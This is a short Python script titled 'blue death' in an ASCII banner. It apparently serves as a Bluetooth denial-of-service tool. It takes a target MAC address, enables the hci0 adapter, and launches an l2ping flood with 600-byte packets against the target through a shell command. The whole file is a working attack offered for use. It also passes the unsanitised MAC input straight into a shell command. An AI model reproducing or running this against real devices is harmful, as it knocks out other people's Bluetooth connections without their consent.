import os
import subprocess
import time
print("""
 _     _                  _            _   _     
| |   | |                | |          | | | |    
| |__ | |_   _  ___    __| | ___  __ _| |_| |__  
| '_ \| | | | |/ _ \  / _` |/ _ \/ _` | __| '_ \ 
| |_) | | |_| |  __/ | (_| |  __/ (_| | |_| | | |
|_.__/|_|\__,_|\___|  \__,_|\___|\__,_|\__|_| |_|
                                                 
""")

mac = input("MAC: ")
xterm_1 = "hciconfig hci0 up"
xterm_2 = "timeout 3s l2ping -i hci0 -s 600 -f %s &" % (mac)

subprocess.Popen(xterm_1,shell=True)
subprocess.Popen(xterm_2,shell=True)


